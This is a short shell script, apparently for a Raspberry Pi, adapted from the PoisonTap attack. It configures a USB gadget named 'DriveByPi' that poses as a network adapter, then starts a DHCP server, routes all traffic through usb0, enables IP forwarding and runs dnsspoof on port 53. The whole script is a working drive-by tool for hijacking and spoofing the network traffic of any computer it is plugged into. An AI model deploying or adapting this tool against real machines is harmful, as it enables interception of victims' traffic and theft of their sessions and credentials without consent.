#!/bin/sh
# Core functionality from poison tap.
# Modified vendor/productid for win7 compatability
#
# TODO: Change serial numbers, 
#       Change MAC Addresses
#       Adapt script to check GPIO       

cd /sys/kernel/config/usb_gadget/
mkdir -p net
cd net

#echo 0x04b3 > idVendor  # IN CASE BELOW DOESN'T WORK
#echo 0x4010 > idProduct # IN CASE BELOW DOESN'T WORK

echo 0x0100 > bcdDevice 	# v1.0.0
echo 0x0200 > bcdUSB 		# USB2

mkdir -p strings/0x409
echo "badc0deddeadbeef" > strings/0x409/serialnumber
echo "DM" > strings/0x409/manufacturer
echo "DriveByPi" > strings/0x409/product
mkdir -p configs/c.1/strings/0x409
echo "Config 1: ECM network" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

mkdir -p functions/acm.usb0
ln -s functions/acm.usb0 configs/c.1/

mkdir -p functions/ecm.usb0
# first byte of address must be even
HOST="48:6f:73:74:50:43"
SELF="42:61:64:55:53:42"
echo $HOST > functions/ecm.usb0/host_addr
echo $SELF > functions/ecm.usb0/dev_addr
ln -s functions/ecm.usb0 configs/c.1/
ls /sys/class/udc > UDC

ifup usb0
ifconfig usb0 up
/sbin/route add -net 0.0.0.0/0 usb0
/etc/init.d/isc-dhcp-server start

/sbin/sysctl -w net.ipv4.ip_forward=1
#TODO: Convert from screen to dns server
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53
